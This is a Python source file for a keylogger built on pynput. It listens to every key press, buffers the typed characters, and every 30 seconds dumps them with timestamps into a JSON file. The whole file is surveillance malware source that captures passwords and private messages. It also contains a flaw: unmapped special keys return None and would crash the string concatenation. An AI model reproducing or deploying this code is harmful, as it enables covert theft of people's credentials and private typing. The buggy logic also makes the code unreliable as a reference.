import time
import datetime
from pynput.keyboard import Listener, Key, KeyCode
import json


class Keylogger:
    def __init__(self):
        self.keys = str()
        self.dict_keys = dict()

    def start_listening(self , file_name):
        listener = Listener(on_press=self._on_press, on_release=None)
        listener.start()
        while True:
            time.sleep(30)
            self._update_dict_keys(file_name)



    def show(self):
        print(self.dict_keys)

    def _update_dict_keys(self, file_name):
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.dict_keys[timestamp] = self.keys
        self.keys = str()
        with open(file_name , 'w') as file:
            json.dump(self.dict_keys , file , indent= False)



    def _on_press(self , key):
        updated_key = Keylogger._special_keys(key)
        self.keys += updated_key

    @staticmethod
    def _special_keys(key):
        dict_special = {
                Key.space: ' ', Key.enter: '\n', Key.tab: '\t'
            }
        if key in dict_special:
                return dict_special[key]
        if isinstance(key, KeyCode) and key.vk is not None:
                if 96 <= key.vk <= 105:
                    return str(key.vk - 96)
        if hasattr(key, 'char') and key.char is not None:
                return key.char

        return None
















